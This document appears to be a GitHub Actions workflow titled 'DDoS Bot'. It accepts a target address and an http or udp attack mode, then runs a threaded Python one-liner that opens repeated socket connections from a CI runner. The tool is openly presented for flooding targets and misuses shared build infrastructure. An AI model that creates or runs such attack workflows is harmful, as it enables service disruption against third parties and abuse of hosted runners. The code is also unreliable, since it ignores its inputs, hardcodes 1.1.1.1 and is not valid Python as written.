name: "🔥 DDoS Bot"
on:
  workflow_dispatch:
    inputs:
      target:
        description: "🎯 Target URL or IP:Port"
        required: true
        default: "httpbin.org"
      mode:
        description: "🔧 Attack Mode"
        required: true
        default: "http"
        type: choice
        options:
          - http
          - udp

jobs:
  attack:
    runs-on: ubuntu-latest
    steps:
      - name: "🚀 Run DDoS Attack"
        run: "python3 -c \"import socket,threading,time;t='${{ github.event.inputs.target }}';m='${{ github.event.inputs.mode }}';print('Target:',t,'Mode:',m);c=0;def a():global c;for _ in range(20):try:s=socket.socket();s.settimeout(1);s.connect(('1.1.1.1',80));s.close();c+=1;except:pass;ts=[threading.Thread(target=a) for _ in range(10)];[x.start() for x in ts];[x.join() for x in ts];print('Requests:',c)\""
